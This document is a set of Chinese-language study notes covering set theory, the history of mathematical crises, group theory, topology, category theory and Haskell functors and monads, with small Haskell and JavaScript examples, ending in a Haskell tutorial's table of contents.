      -  A − B 或者 A ～ B  表示差集（Difference），A 集合关于 B 的差集。
      -  A :sup:`c` 补集（Complement），集合 A 关于某集合（全集）的补集。

      -  a ∈ A     元素 a 属于 A 集合。
      -  b ∉ A     元素 b 不属于 A 集合。

      -  A ∆ B   对称差异，使用 ⊖ 符号表示那些属于 A 又属性 B，但不属于它们的交集的对象。

         A = {3,9,14}
         B = {1,2,3}
         A ∆ B = {1,2,9,14}

      -  A × B   笛卡尔积（Cartesian product），A 和 B 两集中所有元素有序对的集合。

         A = {a, b}
         B = {0, 1, 2}
         A × B = {(a, 0), (a, 1), (a, 2), (b, 0), (b, 1), (b, 2)}

   集合间的元素，通过函数（映射的一种具体形式）规则产生对应关系，如下图：

   ![单射、满射和双射](https://www.shuxuele.com/sets/images/function-mapping.svg)

   图中，将一对多的情况列为不是函数的例子，但在是复变函数，即以复数作为自变量和因变量的函数，
   就存在一对多的映射关系。对于 A、B 两个集合元素之间的映射存在各种情况：

   - 非函数映射 **Mapping**：A 集合元素一对多映射 B 集合元素；
   - 一般函数 **Function**：A 集合元素一对一映射 B 集合元素，B 集合有剩余元素；
   - 单射 **Injective**：A 集合元素一对一映射 B 集合元素，且没有多对一的情况；
   - 满射 **Surjective**：B 集合元素在 A 集合中都有一个元素对应；
   - 双射 **Bijective**：A 和 B 集合的元素一一对应，既是单射又是满射；

   比如，对于 A、B 集合分别为 {1, 2, 3} 和 {2, 4, 9}，映射规则为"平方"，即 𝑓(x) = x²，，
   那么这就是一个满射，即一一对应映射关系的函数：

   - A 集合作为输入称为定义域 **Domain**；
   - B 集合作为函数的实际输出称为值域 **Range**；
   - 而函数可能的输出称为培域 **Codomain**；

   数学史出现过三次危机（Mathematical crisis）：

   *  万物皆数危机，解决方法是修正原来基于有理数的基础上的理论错误，并承认无理数的存在；
   *  微积分中无穷小危机，解决方法是极限论（theory of limitation）；
   *  集合论（现代数学基础语言）危机，通过限制自包含（self-reference）集合的定义回避；

   公元前 500 年左右，古希腊毕达哥拉斯学派作为一个唯心主义学派，认为“万物皆数”，数学知识是
   可靠的、准确的，而且可以应用于现实的世界，数学知识由于纯粹的思维而获得，不需要观察、直觉和
   日常经验。此数指整数 Integer。古希腊加了“古”字前缀是为了区别现在的希腊国。

   据现存《几何原本》最古老的完整抄本，时间大概是公元 9 世纪左右，记录了毕达哥拉斯通过演绎法证明了
   直角三角形斜边平方等于两直角边平方之和，即毕达哥拉斯定理（Pythagorean theorem）。如下图，
   他设计了四个相同的三角形，以及两个按直角边长制作的正方形，将它们拼凑成两个相等的大正方形，
   将三角形移走，剩下的部分也同样相等（红色部分）：

   .. image:: ./pictures/Pythagorean_theorem.svg

   然而，这个定理的公布将引导他的学生希伯斯提出一个致命的疑问！

   有理数（rational number）有一种简单的几何解释：使用水平数轴上标出一段线段作为单位长，
   如果令它的定端点和右端点分别表示数 0 和 1，则可用这条直线上的间隔为单位长的点的集合来表示整数，
   正整数在 0 的右边，负整数在 0 的左边。以 q 为分母的分数，可以用每一单位间隔分为 q 等分的点表示。
   于是，每一个有理数都对应着直线上的一个点。

   公元前 400 年，希伯斯（Hippasus）依靠反证法发现无理数：直线上存在不对应任何有理数的点，
   引发数学史上第一次数学危机。对于全部依靠整数的毕氏哲学，形成一次致命的打击。无理数的发现，
   是毕氏学派的最伟大成就之一，也是数学史上的重要里程碑。他们证明了数轴上存在点 p 不对应于有理数，
   这里距离 op 等于边长为单位长的正方形的对角线的距离，即 √2 这个数。于是就必须发明新的数对应
   这样的点，并且因为这些数不可能是有理数，只好称它们为无理数（irrational number）。

   为了维护学派的威信，他们严密封锁了希帕索斯的发现，并对所有泄露出去的信徒处以极刑——活埋。
   希帕索斯听到风声后，立即逃跑到了国外。在国外流浪了几年后，由于思念家乡，他偷偷地返回了希腊。
   终于在地中海的船上被毕达哥拉斯的忠实门徒发现，并投海淹死。所以，功利的故人都懂得，解决不了
   问题就把提出问题的人解决掉！


   十七世纪时，由于物理学中求解运动的问题越来越多，对微积分的需求变得越来越迫切。在这时，英国
   著名数学家、物理学家牛顿和德国哲学家、数学家莱布尼茨各自独立发明了微积分。牛顿在《求积术》一文
   中使用论证得出了 y = xⁿ 的导数是 nx⁽ⁿ⁻¹⁾。这个方法和结果在实际应用中非常成功，大大推进了
   科学技术的发展。虽然这个结果是正确的，但是牛顿的论证过程实际上存在很大的问题，在处理增量中的
   “无穷小”这个量上，牛顿将其直接略去了事。

   如果函数 y = 𝑓(x) 在开区间内每一点都可导，就称函数 𝑓(x) 在区间内可导。这时函数 y = 𝑓(x)
   对于区间内的每一个确定的 x 值，都对应着一个确定的导数值，这就构成一个新的函数，称这个函数
   为原来函数 y = 𝑓(x) 的导函数，记作 y' 或者 𝑓'(x) 或者 dy/dx 或 df(x)/dx，简称导数。

   导函数（derivative function）是用于在微积分中，描述一个函数曲线的斜率变化率的函数。
   它表示了原函数在每个点的切线斜率。

   函数可导性与导数、连续性之间的逻辑关系如下：

      函数的导数连续 => 函数可导=>  函数连续

   之所以取单向箭头，是因为，箭头后面的每一个条件都仅仅是前一个的必要条件，而不是充分条件。

   Weierstrass 曾构造出闭区间上处处连续但处处不可导的函数。利用贝尔纲定理，可以得到闭区间上
   处处连续但处处不可导的函数不仅存在，而且非常之多，当然这样的函数构造也很困难。

   牛顿在证明过程中略去的无穷小量并不总是零，这就引起一个矛盾。如果它不是零，那么牛顿将其直接
   略去的方法就不够严谨；如果它是零，那它就不能被放在分母中。牛顿对它曾作过三种不同解释：

      *  1669 年说它是一种常量；
      *  1671 年又说它是一个趋于零的变量；
      *  1676 年它被“两个正在消逝的量的最终比”所代替。

   但是，他始终无法解决上述矛盾。莱布尼茨曾试图用和无穷小量成比例的有限量的差分来代替无穷小量，
   但是他也没有找到从有限量过渡到无穷小量的桥梁。于是在极限的问题尚未被完全认清之前，微积分的
   基础问题一直受到一些人的批判和攻击，其中最有名的是贝克莱主教在 1734 年的攻击。贝克莱主教是
   英国著名的哲学家，1734年，他在《分析家或致一位不信神的数学家》中明确指出牛顿论证的逻辑问题，
   为无穷小量的莫名消失而质疑。

   事实上无穷小量不是一个数，它是一个无限趋向零的过程，因此需要引入极限论来解决无穷小问题。


   最近一次危机与集合论有关。十九世纪末，德国数学家康托尔(1845~1918)创立了集合论。 
   罗素悖论（Russell's paradox），也称为理发师悖论，是英国哲学家罗素于 1901 年提出的悖论，
   一个关于类的内涵问题。罗素悖论当时提出自含集合质疑了集合论的缺陷，造成第三次数学危机，至今无解，
   只能通过修改集合定义来避免出现罗素悖论。

      在某个城市中有一位理发师，他的广告词是这样写的：“本人的理发技艺十分高超，誉满全城。
      我将为本城所有不给自己刮胡子的人刮胡子，我也只给这些人刮胡子。我对各位表示热诚欢迎！”
      来找他刮胡子的人络绎不绝，自然都是那些不给自己刮胡子的人。可是，有一天，这位理发师从
      镜子里看见自己长了胡子，他本能地抓起了剃刀，你们看他能不能给他自己刮胡子呢？如果他不
      自己刮胡子，他就属于“不自己刮胡子的人”，他就要给自己刮胡子，而如果他给自己刮胡子呢？
      他又属于“自己刮胡子的人”，他就不该给自己刮胡子。于是产生矛盾。


   1950 年代是数学发展史上的一个重要转折点，得益于计算机的发展，数学家们的研究在强大的计算工具的支持下，
   纷纷开辟出新的研究领域。计算数学、计算几何、数值分析等学科迅速兴起，为数学的发展注入了新的活力。

   1960 年，拓扑学和几何学成为数学研究的热点领域。由于抽象代数的发展，拓扑学和几何学得到了更深入的理解
   和应用。此外，拓扑学的发展还推动了拓扑动力系统和混沌理论的研究。

   1970 年，数学发展的又一个重要时期，数学应用领域得到了广泛的拓展。运筹学、优化理论、控制论等应用数学
   学科迅速发展，为工程、管理、经济等领域提供了强有力的工具。与此同时，数学基础的研究也在不断深化，
   纯数学学科的研究成果为应用数学提供了坚实的基础。

   1980 年代至今，数学的发展呈现出多样化的趋势。在这个时期，数学的分支学科日益细化，研究的方向也更加
   专业化。数学的交叉学科研究成为一个新的研究热点，不同学科之间的交流和合作推动了数学的快速发展。数学
   应用领域也进一步扩展，数据科学、人工智能等新兴领域涌现出一大批数学家。


   代数、分析、几何是现代数学的三大基础分支，它们都基于集合论这一基础的数学语言。M. Hale 绘制
   的数学分支树形能更简明地呈现丰茂的数学分支，以及逻辑与集合语言在数学领域中的基础作用：

   .. figure:: https://users.quipo.it/base5/scuola/mate_metafor_albero1.png
      :target: https://users.quipo.it/base5/scuola/mate_metafor.htm

      The Tree of Mathematics, ©2002 M Hale

      `La matematica come albero 2 <https://www2.stetson.edu/~mhale/logic/tree.htm>`__

      Credit: Margie Hale Professor of Mathematics, Emeritus, Department of Mathematics and Computer Science, Stetson University

   算术（arithmetic）无疑是数学中最古老、最初等的数学。算术研究数的性质及其运算，最大的特点是
   关注数字。算术是把数和数的性质、数和数之间的四则运算在应用过程中的经验累积起来，并加以整理，
   形成的最古老的一门数学。算术运算不仅仅指加减乘除，还可以分数、平方根、取幂和对数；对象包括
   自然数、整数、有理数和实数、复数。

   初等代数（elementary algebra）是古老算术的推广与发展。在古代，算术积累了大量数量问题的解法，
   为寻求更系统、更普遍的各种数量关系的求解方法，产生了以解方程（equations）为中心的初等代数。
   根据实际问题的数量关系（代数式：整式、分式、根式）、等量关系或者不等式，列出列出方程或者方程组。
   方程（组）包括：

      1. 一元一次方程（linear equations with one variable）
      2. 二元一次方程（linear equations with two variable）
      3. 一元二次方程（quadratic equations）
      4. 指数、对数方程（exponential and logarithmic equations）
      5. 无理方程（radical equations）
      6. 线性方程组（system of linear equations）

   高等代数相对于初等代数而言，本质上是一个东西，只是更加系统，扩展了深度与广度。

   初等代数再进一步泛化推广（generalization）就形成了抽象代数，它与初等代数的界限在于：
   初等代数只考虑实数和复数代数结构。

   抽象代数（abstract algebra）、近世代数、现代代数（modern algebra）是同一个意思，甚至简称
   为代数学。主要研究对象是代数结构：群（Group）、环（Ring）、域（Field）、向量空间（Vector space）。

   群（Group）即满足群公理（group axioms）四个基本性质的代数结构与运算的构成的群组。
   假如，非空集合记作 G，运算记作 ·，并且满足群公理的四个性质：

      *  封闭性（closure）：对于 G 群中所有的 a, b，运算 a•b 的结果也在 G 群中；
      *  结合律（Associativity）：对于 G 群中所有的 a, b 和 c，等式 (a•b)•c = a•(b•c) 成立；
      *  单位元（幺元，Identity element）：存在 G 中的一个元素 e，使得 G 群所有的元素 a，总有等式 e•a = a•e = a 成立；
      *  逆元（inverse element）：对于每个 G 中的 a，存在 G 中的一个元素 b 使得总有 a•b = b•a = e，此处 e 为单位元；

   以上定义中的“元”是元素（element）的简称。“幺”意为数字一，即单位元（Identity element）。
   单位元在数学中的作用特点就是：单元和其他元素结合时，并不会改变那些元素。，同样的数学结构，
   不同的运算有不同的单位元。而逆元（inverse element）与单位元密切相关，对任意一个元素 a 与
   它的逆元 ieₐ 组合结果就是其单位元 idₐ。有许多常见的单位元，比如：

      *  实数加法的 0，实数乘法的 1，这两个数字会在群代数中抽象为单位元；
      *  ∧（逻辑与）中的 ⊤（真值），∨（逻辑或）中的 ⊥（假值）；
      *  矩阵乘法中的单位矩阵、矩阵加法中的零矩阵。

   数学定义：若集合 G，在 G 上的二元运算（使用 • 或 * 符号表示二元运算）构成的代数结构，
   •:G • G -> G 记作 {G,•}，满足以上四点，在无歧义时，可将 a•b 写成 ab。从定义上可以理解，

   举个例子，整数（集合）和加法（运算）构成的一个群：

      *  封闭性：对于任何两个整数 a 和 b，它们的和 a + b 也是整数
      *  结合律：对于任何整数 a, b 和 c，(a + b) + c = a +（b + c）
      *  幺元：如果 a 是任何整数，那么 0 + a = a + 0 = a
      *  逆元：对于任何整数 a，存在另一个整数 b 使得 a + b = b + a = 0，整数 b 叫做整数 a 的逆元，记为 a⁻¹

   以上 G 就称为一个加法群。类似地，可以定义乘法群。其它群概念：

   *  原群（magma），对乘法封闭的集合。

   *  阿贝尔群（Abelian groups），又称交换群/加群，即满足交换律的群；

      *  半群（Semigroups）：仅满足群定义中封闭性与结合律；
      *  幺半群（Monoid）：仅满足群定义中封闭性、结合律、单位元。

   *  循环群（Cyclic groups）：

      *  循环群是其所有元素都是特定元素 a 的幂的群。a 称为生成元或本原元。

   幺半群（Monoid）是一个相当简单但是功能强大的概念。它是基本算数幕后的概念：只要有加法或乘法运算
   就可以形成幺半群。在编程中，幺半群无处不在。它们表现为字符串、列表、可折叠数据结构，并发编程未来的
   一些东西，函数式响应编程中的事件等等。

   线性代数（linear algebra）是抽象代数特殊形式，其代数结构为：向量空间（vector spaces）
   以及线性变换（linear mappings），向量空间也称为线性空间（liner spaces）。

   在数学和抽象代数中，群论研究名为群（Group）的代数结构。群在抽象代数中具有基本的重要地位：
   许多代数结构，包括环、域和模等可以看作是在群的基础上添加新的运算和公理而形成的。群的概念在数学的
   许多分支都有出现，而且群论的研究方法也对抽象代数的其它分支有重要影响。群论的重要性还体现在物理学
   和化学的研究中，因为许多不同的物理结构，如晶体结构和氢原子结构可以用群论方法来进行建模。

   现代数学经常涉及一个术语:代数结构（algebraic structure），它是数学研究的对象。不同的数学分支
   使用不同的数学结构统称，也称关系结构，简称结构。代数结构可以从不同角度描述，百度百科描述为：
   代数是研究数、数量、关系与结构的数学分支。MIT 计算机视觉专业林达华在《在数学的海洋中飘荡》 一文描述：

      代数——名称上研究的似乎是数，在我看来，主要研究的是运算规则。一门代数，其实都是从某种
      具体的运算体系中抽象出一些基本规则，建立一个公理体系，然后在这基础上进行研究。一个集合
      再加上一套运算规则，就构成一个代数结构。在主要的代数结构中，最简单的是群(Group)——它只有一种符合结合率的可逆运算，通常叫“乘法”。如果，这种运算也符合交换率，那么就叫
      阿贝尔群(Abelian Group)。如果有两种运算，一种叫加法，满足交换率和结合率，一种叫乘法，
      满足结合率，它们之间满足分配率，这种丰富一点的结构叫做环(Ring)，如果环上的乘法满足交换率，
      就叫可交换环(Commutative Ring)。如果，一个环的加法和乘法具有了所有的良好性质，那么就
      成为一个域(Field)。基于域，我们可以建立一种新的结构，能进行加法和数乘，就构成了线性代数
      (Linear algebra)。

      代数的好处在于，它只关心运算规则的演绎，而不管参与运算的对象。只要定义恰当，完全可以让一只
      猫乘一只狗得到一头猪:-)。基于抽象运算规则得到的所有定理完全可以运用于上面说的猫狗乘法。
      当然，在实际运用中，我们还是希望用它干点有意义的事情。学过抽象代数的都知道，基于几条最
      简单的规则，比如结合律，就能导出非常多的重要结论——这些结论可以应用到一切满足这些简单规则
      的地方——这是代数的威力所在，我们不再需要为每一个具体领域重新建立这么多的定理。

   拓扑学是研究拓扑空间（Topological space）的数学分支，即研究几何图形变化的学问。它有一个
   更形象的名称是“橡皮几何学”，假设将三角形的橡皮捏成正方形，什么变化了？什么没变呢？欧氏几何中
   有一条定理（Euler's Formula）：一个多面体（polyhedron）顶点与边数、面数的差恒为 2
   （vertices - edges + faces = 2），公式表示：

      𝒗 - 𝑒 + 𝑓 = 2

   1872 年 Klein 于爱尔兰根纲领（Erlanger Programme）中所述：几何是研究在某种运动群下不变的性质。

   广义拓扑学是探求同类事物的共性所在的学问，即一种宏观的归纳推理（inductive reasoning）。
   拓扑学将数学分析从一维的实数轴推广到一般空间，这也是现代分析的抽象基础。

   拓扑学把极限的概念推广到一般的拓扑空间，并引入微分结构，在流形上的分析之上发展出微分几何。
   在微积分里面，极限之后我们有微分、求导、积分。这些东西也可以推广到拓扑空间，在拓扑学的基础上
   建立起微分几何。从教学上说，微分几何的教材，有两种不同的类型，一种是建立在古典微机分的基础上
   的“古典微分几何”，主要是关于二维和三维空间中的一些几何量的计算，比如曲率。还有一种是建立在
   现代拓扑学的基础上，这里姑且称为“现代微分几何”（核心概念是“流形”），在拓扑空间的基础上加了
   一套可以进行微分运算的结构。除了推广微积分的概念以外，还引入了很多新概念：tangent space, 
   cotangent space, push forward, pull back, fibre bundle, flow, immersion, 
   submersion 等等。

   近些年，流形在 machine learning 似乎相当时髦。但是，坦率地说，要弄懂一些基本的流形算法，
   甚至“创造”一些流形算法，并不需要多少微分几何的基础。对我的研究来说，微分几何最重要的应用就是
   建立在它之上的另外一个分支：李群、李代数——这是数学中两大家族分析和代数的一个漂亮的联姻。分析和
   代数的另外一处重要的结合则是泛函分析，以及在其基础上的调和分析。


   现代数学的基础是集合论，研究对象就不再是数和形这两大传统、经典的研究领域，而是空间（spaces）
   和流形（manifold）。“流形”，是对“多重、多样、繁复”这个意义的变相直译。它们都能用集合和映射的
   概念统一起来，已很难区分哪些属于数的范畴，哪些属于形的范畴。

   现代数学建立在集合论这个共同的基础上，集合论中有一些基本的概念，如前面介绍过的集合，还有
   关系、函数、等价等，作为数学各个分支的共同语言。同时又因不同分支的需要引入了许多数学结构
   （Mathematical Structures/Objects），常见的结构有：序（Order）、代数结构、
   拓扑（Topology）、模（module）、格（Lattice）、测度（Measure）、度量（Metric）/几何、
   等价关系、范畴（Category）、微分结构等。

   上世纪中期盛极一时的法国布尔巴基学派（结构主义）曾提出数学的三种基本结构：

      1. 代数结构：由集合及其上的运算组成，如群、环、域、模、线性空间等。
      2. 序结构：由集合及其上的序关系组成，如偏序集、全序集、良序集。
      3. 拓扑结构：由集合及其上的拓扑组成，如拓扑空间、度量空间、流形、紧致集等。

   The Bourbaki school 将 mathematical structures 分为三类：Order structures，
   Algebraic structures，Topological structures，他们都基于 set theory，更高阶的
   数学结构基本上可以归为这三种基本类型的组合。

   使用同一套语言（集合论）的现代代数学的强大所在：只要证明了一个关于某个代数结构的一般的事实，
   就再也没有必要在每一次与这个结构的特例相遇时候，再去分别指明一次这个事实。这个抽象的途径使得
   我们能在看来完全不相同的背景下，看出很重要的相似之处。

   集合论中最基本的概念：集合（set），关系（relation），函数（function），等价（equivalence）
   在其他数学分支的语言中几乎必然存在的。

   从初等代数语言切换到基于集合的抽象代数语言，基本概念被进一步泛化（Generization of relation）
   为等价关系，这个泛化过程发生在整个数学历史进程中。不同的记号（notation）意味着不同的思维方式、
   抽象层次，可以表示为以下这个数值大小比较的具体例子来说明：从具体含义的数字抽象为使用代数符号
   表示具体的数字，再从具体的 > 大于比较符号抽象为一个可以表示任意二元运算关系的符号（⫐）：
   ::

       2 > 1  ==>  a > b  ==>  a ⫐ b 
      ───┬───     ───┬───     ───┬─── 
         │           │           │    
         │           │           └─Stage 3: 运算符号抽象表达（binary operation）
         │           └─Stage 2: 代数（Algebraic）
         └─Stage 1: 算术（arithmetic）

   等价关系满足：（1）自反性（reflexivity），（2）对称性（symmetry）（3）传递性（transitivity）。

   相关代数结构及其泛化对象的对照如下：

      *  初等代数中的数延伸为集合，即从主要研究对象由数这种初始的数学结构转变为集合结构。
      *  加减乘除运算抽象为二元运算 * (binary operation)，与集合一起构成群（Group）代数结构。
      *  群代数中将数字 0 和 1 抽象为单位元（identity elements），分别为加法、剩法单位元。
      *  负数抽象为逆元素（inverse element），加法、乘法中，a 的逆元素分别是 -a 和其倒数 a⁻¹。
      *  开集、闭集(Open/Closed Set) 对应代数中的开区间、闭区间（open/closed interval）。
      *  最小的范畴（拥有 0 个对象的范畴）对应空集合 ∅。最小范畴没有对象，自然也就没有态射。

      ===========================   ========================================
      Set theory                    Category theory
      ===========================   ========================================
      membership relation           -
      sets                          categories
      elements                      objects
      -                             morphisms
      functions                     functors
      equations between elements    isomorphisms between objects
      equations between sets        equivalences between categories
      equations between functions   natural transformations between functors
      ===========================   ========================================

   数据表来自 `nLab - category theory <https://ncatlab.org/nlab/show/category+theory>`__

   在抽象代数中，同构（isomorphism）指的是一个保持结构的双射（既是单射又是满射）。在更一般的
   范畴论语言中，同构是指：一个态射，且存在另一个态射，使得两者的复合是一个恒等态射。也就是存在
   对应的逆元（inverse element），这体现了等价关系的对称性（symmetry），使用 ≈ 符号表示。

   纯数学家研究的是不同的抽象结构，但如果把不同的数学结构，如群（Group）、偏序（Partial）、
   拓扑空间等，进行进一步的抽象，研究结构之上的结构，这就是范畴（Category theory）。
   若再度抽象，就得到了函子（functor），再往上就是自然变换（natural transformation）。
   范畴论还可以继续研究抽象的抽象，直至无穷。

   The Joy of Abstraction - An Exploration of Math, Category Theory, and Life
   by Eugenia Cheng

   《抽象乐趣》一书是非常好的一本范畴论入门书，它从具象出发，演绎出范畴论所涉及的各个抽象概念。
   以下是此此书整理的一张等价关系表（Equivalence relations）：
   ::

      9.2 Equivalence relations 

      Finally here’s a table summing up how we regard equivalence relations as
      categories. These are deep ideas and might be difficult at first. Note the 
      “mis-match” between what counts as data, structure and properties on each side.

                  equivalence
                    relation                     category
      =========== =============  ============  =============  ==========
         DATA        objects       ------->       objects
      STRUCTURE     relations      ------->       arrows         DATA
      =========== =============  ============  =============  ==========
                   reflexivity     ------->     identities
      PROPERTIES    symmetry       ------->      inverses      STRUCTURE
                  transitivity     ------->     composition
      =========== =============  ============  =============  ==========
                                               unit laws
                                               associativity  PROPERTIES

   范畴论是高度抽象的理论，脱胎自群论（Group theory）、拓扑学（Topology）等数学分支的研究需要。
   范畴论（category theory）又被称为为数学中的数学，抽象中的抽象、抽象废话（abstract nonsense）。

   须知道范畴论引入了小范畴（small category）和大范畴（large category）两个概念，原因是不能
   构造所有集合的集合，因为罗素悖论问题，集合论需要约束自含集合的定义。小范畴：对象是一个集合的范畴。
   如果一个小范畴的对象的同构是一个集合，则称基本小（essentially small）范畴，显然小范畴总是基本小的。

   以下使用自然语言定义范畴论中的基本概念：

   **范畴（category）是一种包含对象及对象之间使用箭头关联的代数结构。**

   **态射（morphism）是在数学中是指两个数学结构之间保持结构的一种映射。**

   **函子（functor）是范畴到范畴、态射到态射、对象到对象的映射，包括单位态射与复合态射。**

   应该把函子看作态射的映射——这个观点在 Haskell 的 ``fmap`` （Functor）类型的定义中得到强调。
   当然，函子也映射对象（态射的两个端点），否则就没法谈论保持复合。范畴中的对象说明了哪些态射对
   可以复合（composition）。其中一个态射的终点必须等于另一个态射的起点——如果它们能复合。所以如果
   要把态射的复合映射为提升后的态射的复合，就很大程度上被决定了端点（对象）的映射。

   态射（morphism）是范畴中的一个基本概念，它是集合上的映射的推广。范畴论中使用函子来描述
   各种范畴间的关系，即函子（functor）是范畴间的态射：函子是描述了从某范畴 C 的对象映射到
   某范畴 D 中的对象，把范畴 C 中的态射映到范畴 D 中的态射。

   范畴论最大的特点就是将范畴中的对象的细节忽略掉，将对象看成一个点，通过态射来描述一个
   对象是什么。而态射又是可组合的，可组合性是范畴论中一个非常重要的性质，经常在构造数据
   类型和解决问题时用到。数学上使用 ∘ （composition）符号表示组合，Haskell 语言中使用
   句点（.）表示。

   数学上使用从 域 到 陪域 的箭头来表示态射，例如 f: X -> Y 表示态射 f 的域为 X，陪域为 Y。
   所有从 X 到 Y 的态射集合记为 homC(X,Y) 或者 hom(X,Y)。也有写作 MorC(X,Y) 或 Mor (X,Y)。
   Haskell 中的类型系统中有 Arrows 类型来描述态射的箭头符号。注意，态射表达式中的箭头符号
   代表的是关于两对象间存在的某种关系，这是态射表达式的重点。态射可以看作是函数的提升，态射是比函数
   更泛化的映射。

   范畴的正式定义如下，包含 2 类对象、2 种运算和 2 条运算规则，原文引用自斯坦福哲学百科文档：：
   ::


1.域运算：给每个态射指定范畴中一个对象。
2.陪域运算：给每个态射指定范畴中一个对象。
态射经常用从其域到其陪域的箭头来表示，例如若一个态射f域为X而陪域为Y，它记为f:X→Y。所有从X到Y的态射集合记为homC(X,Y)或者hom(X,Y)。（有些作者采用MorC(X,Y)或Mor(X,Y)）。
3.复合运算：对于<f:X→Y,g:Y→Z>，指定（或gf和fg）。态射的复合经常采用交换图表来表示。
4.单位运算：对于每个对象X，指定一个态射idX:X→X，称为X上的单位态射。

      态射必须满足两条运算规则：

         *  单位律（unit law）：对于每个对象 X，存在一个恒等态射 
            idₓ : X → X 使得对于每个态射 f : M → N 有 idₘ ∘ f = f = f ∘ idₙ
         *  结合律（associativity）：h ∘ (g ∘ f) = (h ∘ g) ∘ f 存在于任何操作有定义的时候。

      单位律也有称为幺元律、幺律。恒等态射也称为单位态射（identity morphisms），是数学中众多
      单位元的一个。单位元的特点就是：任何对象与之运算保持这个对象不变。

   态射常用状态转换图表示，以下展示了范畴论的态射转换图的抽象表达与具象表达。左侧对应的是具象化
   态射转换图。蓝色箭头、符号表示态射本身（即范畴对象间的映射关系），红色大写字母表示范畴（对象集合），
   范畴 𝔸 可以具象化为一个班级的学生，范畴 𝔹 是年龄，范畴 ℂ 是布尔值。𝔸 通过 Age 态射映射为 𝔹，
   再通过 ≥ 18　映射为 ℂ。通过组合（composition）态射，≥ 18 ∘ Age，𝔸 直接映射为 ℂ。这里没有
   标明单位元，只需要知道存在这样的 id，它与其它对象运算，即经过单位态射映射又回到这个对象的自身。
   在计算机编程语言领域，它就如同 self 关键字一样。面向对象编程中的多态（polymorphisms）可以
   看作是态射概念的延伸。

   甚至具象化为更简单的形式，𝔸 为数字 1，𝔹 为数字 2，ℂ 为数字 4，而它们之间的态射匀为 ``2 的乘方``。
   这就将高度抽象的范畴转换回到初等代数，当然这并非是设计范畴这种高度抽象的数学结构的本意。

   .. figure:: ./pictures/category_concretization.svg

      `An Introduction to Category Theory, Abstraction and Algebra <https://www.bilibili.com/video/BV1LP411W7Ab>`__


                           ┌─────────┐
                           │Allliccce│
                           └────┬────┘
                                │──────┐
                                │      │
                                │<<<───┘
                                │
                           ┌────┴────┐
                           │Allliccce│
                           └─────────┘



   

   单位态射（identity morphisms）或者

   函子可以解释为 小范畴（small category) 内的 态射。

   集合范畴可以找到对位的描述，objects 对应 sets，morphisms 对应 functions，这可以
   降低范畴的抽象程度，帮助理解范畴这一抽象概念。

   *  同态 homomorphism
      意义：提供了一种简化研究对象结构但是保留了原图邻接关系的一种方法.

      定义：给定图 G,H
      ，若存在映射 f:V(G)→V(H)
       使得 uv∈E(G)
       可以推出 f(u)f(v)∈E(H)
      ，则称 G
       同态于 H
      ，记为 G→H
      ，也称 G
       是 H
      -可着色的（图 H
       的任意一种正常着色可以给出图 G
       的一种正常着色）.

      上面 f
       只是映射，可能不是单射（好几个萝卜放到一个坑里了），也可以不是满射（有的坑里没有萝卜）.

   *  同构 isomorphism
      若 f
       是双射，则称 G
       同构于 H
      . 此时两个图有相等数目的顶点和边.

      图 G
       的中心 core 是 G
       的一个极小子图 H
       且满足 G→H
      . 在同构意义下，任意图 G
       只有一个 core.

   *  同胚 homeomorphism
      定义：给定图 G,H
      ，若 G
       的某个细分图同构于 H
       的某个细分图（subdivision，边上添加2度点），则称 G
       和 H
       同胚.

   单子（Monad）是范畴论中的一个基本概念，单子又称为三子（triple），单子是自函子范畴上的一个"幺半群"，
   范畴 C 到自身的函子称为该范畴的自函子 (endofunctor)。恒等函子（identity functor）
   就是一个单子，并且没有副作用（side effects）。

      Definition 2.2. A monad on a category C is a triple (T, η, µ), 
      where T : C → C is an endofunctor and η : Id_C ⇒ T 
      and µ : T² ⇒ T are natural transformations

      On Some Aspects of The Theory of Monads - Carsen Berger
      https://math.uchicago.edu/~may/VIGRE/VIGRE2011/REUPapers/Berger.pdf



   函数式编程中常见的构造是「函子」（functor），Haskell 里的 ``Maybe`` 是个很好的例子，
   它是系统库定义的一个类型，一个 ``Monad`` 类型实例，因此它是一个函子。

   Maybe 类型使用 ``data`` 关键字定义。Just a 和 ``Nothing`` 是两个构造器，前者代表一个值，
   后者代表没有值，通常代表操作返回的 failure 状态：
   ::

      -- data Maybe a = Just a | Nothing

      ghci> :t Nothing
      Nothing :: Maybe a

      ghci> :t Just 'a'
      Just 'a' :: Maybe Char

      ghci> :t Just 1
      Just 1 :: Num a => Maybe a 

   maybe 函数接收三个参数：a default value, a function, a Maybe value
   如果接收到的 Maybe 的值是 Nothing，那么返回默认值。否则，对 Just 值调用函数 (a -> b) 获取返回值。
   ::

      ghci> :t maybe
      maybe :: b -> (a -> b) -> Maybe a -> b

      ghci> maybe False even (Just 2)
      True

      ghci> maybe False odd  (Just 3)
      True

   假设有一个用于求和的 JavaScript 函数 add(a, b, c)，它接收三个数值并返回它们的和。
   这显示不符合 Currying 化的一个函数，以下尝试将它转换为 currying 形式：

   .. code-block:: JavaScript

      function add(a, b, c)
      {
         return a + b + c;
      }

      function add_curried(n)
      {
         let sum = n;
         let add = (n) => { return n==null? sum : (sum += n, add) };
         return add
      }

   转换为 currying 形式后的 add_curried(n) 只接收一个参数，它内部使用了 JavaScript 箭头
   函数来简化表达式，这个函数内部判断在没传入参数的情况下才输出 sum 值，功能上和原函数有些出入。
   并且，也不太符合 Haskell 的惰性求值（Lazy Evaluation）。但是，这种输入一个值，输出一个
   对应值的形式就是 functor 的典型行为。

   当一个接收一个参数 a 并返回一个 b，这个函数签名就用 a -> b 表示。函子

   IO Monad 类型都是有副作用的类型，因为需要操作 I/O，输入字符一般与文件设备对应。

   以下是 Haskell 三类最基本的函子类型说明，它们依次为派生关系，可用 :type 命令查看其类型信息：
   
   .. code-block:: haskell

      -- Functor:
      fmap  ::     Functor f => (a -> b) -> f a -> f b

      -- Applicative:
      (<*>) :: Applicative f => f (a -> b) -> f a -> f b

      -- Monad:
      (>>=) ::       Monad m => m a -> (a -> m b) -> m b

   fmap 

   .. code-block:: haskell

      ghci> fmap (+1) [1,2,3]
      [2,3,4] 



======================
/Haskell for Beginners
======================
*   学习一门新语言之Haskell https://blog.tonycrane.cc/p/b3ca5c18.html

.. container:: content

   .. rubric:: 目录
      :name: 目录
      :class: menu-label

      目录

         #0  总章
         #1  基础语法与函数
         #2  高阶函数与模块
         #3  类型与类型类
         #4  输入输出与文件
         #5  函子、应用函子与单子
         #6  半群与幺半群
         #7  一些其它类型类
         #A  Haskell 与范畴论


      -  `1 前言 <#前言>`__
      -  `2 基础运算 <#基础运算>`__

         -  `2.1 函数调用 <#函数调用>`__

      -  `3 List <#List>`__

         -  `3.1 Texas ranges <#Texas-ranges>`__
